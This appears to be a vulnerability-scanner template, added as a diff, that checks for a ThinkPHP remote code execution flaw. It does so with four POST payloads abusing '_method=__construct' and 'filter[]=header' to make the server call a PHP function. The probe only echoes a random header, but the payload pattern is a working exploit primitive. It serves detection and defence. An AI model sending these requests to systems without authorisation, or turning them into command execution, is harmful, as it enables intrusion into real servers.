@@ -1,0 +1,54 @@
+name: yaml-poc-thinkphp-thinkphp-rce-CT-381889
+binding: 0aabf39c-6a0f-4b7e-801f-94630be40615
+detail:
+    author: system_user
+    vulnerability:
+        id: b986337c-2483-4a4d-a658-62bca6a8d108
+        level: critical
+    warning: Harmless
+transport: http
+set:
+    rHeader: randomLowercase(8)
+    r1: randomLowercase(10)
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /index.php?s=captcha
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: |
+                _method=__construct&filter[]=header&method=GET&server[REQUEST_METHOD]={{rHeader}}:{{r1}}
+        expression: response.headers[rHeader].startsWith(r1)
+    r1:
+        request:
+            cache: true
+            method: POST
+            path: /index.php?s=captcha
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: |
+                _method=__construct&filter[]=header&method=get&get[]={{rHeader}}:{{r1}}
+        expression: response.headers[rHeader].startsWith(r1)
+    r2:
+        request:
+            cache: true
+            method: POST
+            path: /index.php?s=index/index
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: |
+                s={{rHeader}}:{{r1}}&_method=__construct&method=&filter[]=header
+        expression: response.headers[rHeader].startsWith(r1)
+    r3:
+        request:
+            cache: true
+            method: POST
+            path: /
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: |
+                _method=__construct&filter[]=header&server[REQUEST_METHOD]={{rHeader}}:{{r1}}
+        expression: response.headers[rHeader].startsWith(r1)
+expression: r0() || r1() || r2() || r3()
